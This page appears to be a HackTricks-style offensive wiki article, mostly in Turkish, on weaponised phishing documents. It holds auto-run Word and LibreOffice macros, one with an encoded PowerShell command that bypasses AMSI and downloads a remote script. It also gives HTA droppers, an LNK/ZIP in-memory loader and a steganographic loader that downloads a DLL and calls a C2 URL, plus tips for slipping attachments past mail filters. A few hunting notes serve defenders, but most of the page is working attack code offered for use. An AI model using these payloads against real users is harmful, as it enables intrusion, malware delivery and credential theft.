# Phishing Dosyaları & Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerinin doğrulamasını yapar. Veri doğrulaması, OfficeOpenXML standardına göre veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, incelenen dosya açılmayacaktır.

Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma yeteneklerini korumak mümkündür.\
Örneğin, RTF dosyası tasarım gereği makroları desteklemez, ancak bir DOCM dosyası RTF olarak yeniden adlandırılırsa Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite (Excel, PowerPoint etc.) içindeki tüm yazılımlar için geçerlidir.

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
Makrolar içeren ve uzak bir şablona referans veren DOCX dosyaları (File –Options –Add-ins –Manage: Templates –Go) makroları da “çalıştırabilir”.

### Harici Resim Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Kategoriler**: Links and References, **Filed names**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Makro Arka Kapısı

Belgeden rastgele kod çalıştırmak için makrolar kullanılabilir.

#### Otomatik yükleme fonksiyonları

Ne kadar yaygınlarsa, AV tarafından tespit edilmeleri o kadar olasıdır.

- AutoOpen()
- Document_Open()

#### Makro Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metaverileri elle kaldırın

Şuraya gidin: **File > Info > Inspect Document > Inspect Document**, bu Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information** bölümünün yanında **Remove All**'a tıklayın.

#### Doc Extension

İşiniz bittiğinde, **Save as type** açılır menüsünden formatı **`.docx`**'den **Word 97-2003 `.doc`**'e değiştirin.\
Bunu yapın çünkü **`.docx` içinde macro's kaydedemezsiniz** ve macro-enabled **`.docm`** uzantısı etrafında bir **stigma** vardır (ör. küçük resim simgesinde büyük bir `!` görünür ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, **eski `.doc` uzantısı en iyi uzlaşıdır**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer belgeleri Basic macros gömebilir ve dosya açıldığında macro'yu **Open Document** olayına bağlayarak otomatik çalıştırabilir (Tools → Customize → Events → Open Document → Macro…). Basit bir reverse shell macro şöyle görünür:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Dize içindeki çift tırnaklara (`""`) dikkat edin – LibreOffice Basic bunları literal tırnakları kaçışlamak için kullanır, bu yüzden `...==""")` ile biten payloads hem iç komutu hem de Shell argümanını dengede tutar.

Teslimat ipuçları:

- `.odt` olarak kaydedin ve makroyu belge olayına bağlayın, böylece açıldığında hemen tetiklenir.
- `swaks` ile e‑posta gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece ek olarak dosya baytları, dosya adı dizgesi değil, gönderilir). Bu, doğrulama yapmadan rasgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritiktir.

## HTA Files

Bir HTA, **HTML ve scripting dillerini (ör. VBScript ve JScript) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tam güvenilir" bir uygulama olarak çalıştırılır.

Bir HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu araç genellikle **Internet Explorer** ile birlikte **kurulur**, bu da **`mshta`'nın IE'ye bağımlı** olmasına neden olur. Dolayısıyla IE kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**

**Check these ideas and more in the following pages:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Sadece hash'i veya kimlik doğrulamasını çalmanın yanı sıra **perform NTLM relay attacks** da gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Oldukça etkili kampanyalar, içinde iki meşru tuzak belge (PDF/DOCX) ve kötü amaçlı bir .lnk bulunan bir ZIP teslim eder. Hile şu ki gerçek PowerShell loader, ZIP’in ham baytlarının içinde benzersiz bir işaretçiden sonra saklanır ve .lnk bunu bellekte parçalayıp tamamen çalıştırır.

Typical flow implemented by the .lnk PowerShell one-liner:

1) Orijinal ZIP'i yaygın dizinlerde ara: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, ve geçerli çalışma dizininin üst dizini.
2) ZIP baytlarını oku ve sabit kodlanmış bir işaretçi bul (ör. xFIQCV). İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP'i %ProgramData% içine kopyala, orada aç ve meşru görünmesi için tuzak .docx'i aç.
4) Mevcut süreç için AMSI'yi atla: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamayı deobfuske et (ör. tüm # karakterlerini kaldır) ve bellekte çalıştır.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Teslimatlar sıklıkla tanınmış PaaS alt alan adlarını kötüye kullanır (ör. *.herokuapp.com) ve yükleri IP/UA'ya göre sınırlayabilir (zararsız ZIP'ler sunabilir).
- Bir sonraki aşama genellikle base64/XOR shellcode'u çözer ve disk izlerini azaltmak için Reflection.Emit + VirtualAlloc ile çalıştırır.

Aynı zincirde kullanılan persistence
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. Ayrıntılar ve kullanıma hazır komutlar için bakınız:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisine eklenmiş ASCII işaretçi dizisini (ör. xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için üst/kullanıcı klasörlerini listeleyen ve bir aldatıcı belge açan .lnk.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Güvenilir PaaS alan adları altında barındırılan linklerle biten uzun süre çalışan iş parçacıkları.

## Steganography-delimited payloads in images (PowerShell stager)

Son loader zincirleri, obfuskeli bir JavaScript/VBS teslim eder; bu, gömülü Base64 PowerShell stager'ı çözer ve çalıştırır. Bu stager genellikle GIF olan bir görüntü indirir; bu görüntü, benzersiz başlangıç/bitiş işaretleri arasında düz metin olarak gizlenmiş Base64-encoded .NET DLL içerir. Script bu delimitörleri arar (vahşi örneklerde görülen işaretler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64 çözümler (byte'lara), assembly'yi belleğe yükler ve bilinen bir giriş metodunu C2 URL'si ile çağırır.

İş akışı
- Stage 1: Archived JS/VBS dropper → gömülü Base64'i çözer → PowerShell stager'ı -nop -w hidden -ep bypass ile başlatır.
- Stage 2: PowerShell stager → görüntüyü indirir, işaretlerle sınırlanmış Base64'i ayrıştırır, .NET DLL'i belleğe yükler ve onun metodunu (ör. VAI) C2 URL'si ve seçeneklerle çağırır.
- Stage 3: Loader nihai payload'u alır ve tipik olarak onu process hollowing ile güvenilir bir binary'ye (genellikle MSBuild.exe) inject eder. process hollowing ve trusted utility proxy execution hakkında daha fazla bilgi için bakınız:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell örneği: bir görüntüden DLL çıkarmak ve .NET metodunu bellekte çağırmak için:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu ATT&CK T1027.003 (steganography/marker-hiding) örneğidir. Markörler kampanyadan kampanyaya değişir.
- AMSI/ETW bypass and string deobfuscation genellikle assembly'yi yüklemeden önce uygulanır.
- Avlama: indirilen görüntüleri bilinen ayırıcılar için tara; görüntülere erişen ve Base64 blob'larını hemen çözen PowerShell'i tespit et.

Ayrıca stego araçları ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Tekrarlayan bir ilk aşama, arşiv içinde teslim edilen küçük, yoğun şekilde obfusk edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı gömülü bir Base64 dizisini çözmek ve sonraki aşamayı HTTPS üzerinden başlatmak için `-nop -w hidden -ep bypass` ile PowerShell'i çalıştırmaktır.

İskelet mantığı (soyut):
- Kendi dosya içeriğini oku
- Çöp diziler arasındaki bir Base64 blob'unu bul
- ASCII PowerShell'e dönüştür
- `wscript.exe`/`cscript.exe` ile `powershell.exe`'i çağırarak çalıştır

Avlama ipuçları
- Arşivlenmiş JS/VBS ekleri komut satırında `-enc`/`FromBase64String` ile `powershell.exe` başlatıyor.
- `wscript.exe`, kullanıcı temp yollarından `powershell.exe -nop -w hidden` başlatıyor.

## Windows files to steal NTLM hashes

Bakınız: **places to steal NTLM creds** sayfası:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Kaynaklar

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
